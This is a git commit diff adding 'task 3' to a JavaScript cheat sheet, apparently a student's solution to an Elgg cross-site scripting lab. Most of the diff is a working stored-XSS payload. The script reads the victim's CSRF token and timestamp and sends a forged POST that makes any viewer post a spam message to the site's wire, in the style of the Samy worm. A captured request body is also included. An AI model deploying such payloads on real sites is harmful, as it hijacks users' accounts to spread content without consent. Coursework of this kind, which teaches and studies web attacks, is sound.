39707404fabac0eff430c048259b6dc7a44651a5
Raihan Rasheed Apurbo <coolest_apurbo@yahoo.com>
2021-06-21 02:51:00 -0400

    task 3 completed

--- Cheat Sheet.js
+++ Cheat Sheet.js
@@ -136,8 +136,35 @@ accesslevel%5Btwitter%5D=1
 guid=44
 
 
+wire post link: http://www.xsslabelgg.com/action/thewire/add
+content:
+__elgg_token=sWqZS3M83yWXeu6D5soKsw&__elgg_ts=1624257309&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy
+//solution 3
 
 
+<script type="text/javascript">
+	window.onload = function(){
+		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+		//and Security Token __elgg_token
+		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+		var token="&__elgg_token="+elgg.security.token.__elgg_token;
+		//Construct the content of your url.
+		var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
+		var content=token+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; //FILL IN
+	
+		if(elgg.session.user.guid!=elgg.page_owner.guid)
+		{
+			//Create and send Ajax request to modify profile
+			var Ajax=null;
+			Ajax=new XMLHttpRequest();
+			Ajax.open("POST",sendurl,true);
+			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+			Ajax.setRequestHeader("Content-Type",
+			"application/x-www-form-urlencoded");
+			Ajax.send(content);
+		}
+	}
+</script>
 
 // solution 2
 
